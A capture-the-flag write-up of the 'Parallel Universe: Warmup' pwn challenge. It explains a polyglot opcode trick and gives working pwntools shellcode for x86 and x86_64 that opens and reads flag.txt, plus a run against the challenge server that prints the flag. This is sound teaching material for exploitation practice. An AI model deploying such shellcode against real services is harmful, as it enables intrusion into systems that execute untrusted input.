# Parallel Universe: Warmup
**Author: PewZ**

**Difficulty: easy**

**Category: pwn**

---

We are given two binaries that read and execute shellcode. We are given a list
of allowed syscalls, and we have to read the flag from `flag.txt`.
The catch is that our shellcode has to simultaneously work on both x86 and
x86_64.

There are many great writeups of other polyglot shellcode challenges, for
example these two:
* https://tcode2k16.github.io/blog/posts/2019-04-08-midnightsunctf-polyshell-writeup/
* https://www.robertxiao.ca/hacking/defcon2018-assembly-polyglot/

In this writeup, we will use a trick from the first writeup that makes it
simple to run shellcode on both x86 and x86_64. The trick is to use the
following opcode: `31c941e2XX`. x86 will interpret it like this:
```asm
xor ecx, ecx
inc ecx
loop XX+5
```

x86_64 however, interprets it like this:
```asm
xor ecx, ecx
loop XX+5
```

Notice the `inc ecx` instruction? This makes x86 skip the jump, while x86_64
will following the jump. `XX` is the distance to jump, so we can construct our
payload like this:

```
31c941e2XX
32-bit shellcode
64-bit shellcode
```

Where `XX` is the length of the 32-bit shellcode. Before sending the payload to
the remote service, we can double-check that it works for both the binaries
separately.

The shellcode used is a simple payload that opens `flag.txt`, reads data from
the returned file descriptor, and writes it back to stdout. We use the region
where our shellcode is located as a buffer for the flag, since it memory is
marked as rwx.

Here is the relevant code from the solution script:
```python
# https://tcode2k16.github.io/blog/posts/2019-04-08-midnightsunctf-polyshell-writeup/
def get_i386():
    context.arch="i386"
    payload = asm("""
    jmp there
here:
    pop ebx /* filename */
    mov ecx, {open_flags}
    mov eax, {sys_open}
    int 0x80

    /* read flag */
    call lol
lol:
    pop esi
    add esi, 0x200
    mov ebx, 0
    mov ecx, esi
    mov edx, 0x40
    mov ebx, eax /* fd from open() */
    mov eax, {sys_read}
    int 0x80

    /* write flag to stdout */
    mov edx, eax
    mov ecx, esi
    mov ebx, 1
    mov eax, {sys_write}
    int 0x80

    xor ebx, ebx
    mov eax, {sys_exit}
    int 0x80
there:
    call here
""".format(sys_open=int(constants.SYS_open),
           sys_exit=int(constants.SYS_exit),
           open_flags=int(constants.O_RDONLY),
           sys_read=int(constants.SYS_read),
           sys_write=int(constants.SYS_write)), arch="i386", os="linux", bits=32) + "flag.txt\x00"

    return payload

def get_amd64():
    context.arch="amd64"
    payload = asm("""
    lea rdi, [rip + flag]
    mov r8, rdi
    mov rsi, {open_flags}
    mov rax, {sys_open}
    syscall

    mov rdi, rax
    add r8, 0x100
    mov rsi, r8
    mov rdx, 0x40
    mov rax, {sys_read}
    syscall

    mov rsi, r8
    mov rdi, 0x1
    mov rdx, rax
    mov rax, {sys_write}
    syscall

    xor rdi, rdi
    mov rax, {sys_exit}
    syscall
flag:
""".format(open_flags=int(constants.O_RDONLY),
            sys_open=int(constants.SYS_open),
            sys_exit=int(constants.SYS_exit),
            sys_read=int(constants.SYS_read),
            sys_write=int(constants.SYS_write)), arch="amd64", os="linux", bits=64) + "flag.txt\x00"
    return payload

sc_32 = get_i386()
sc_64 = get_amd64()
payload = unhex('31c941e2{:x}'.format(len(sc_32)))
payload += sc_32
payload += sc_64
```

Now let's test the script!
```console
$ python2 solve.py
[+] Opening connection to parallel.tghack.no on port 6004: Done
[*] Switching to interactive mode
Please give me some shellcode :))
TG20{parallel_universes_ftw_}
```
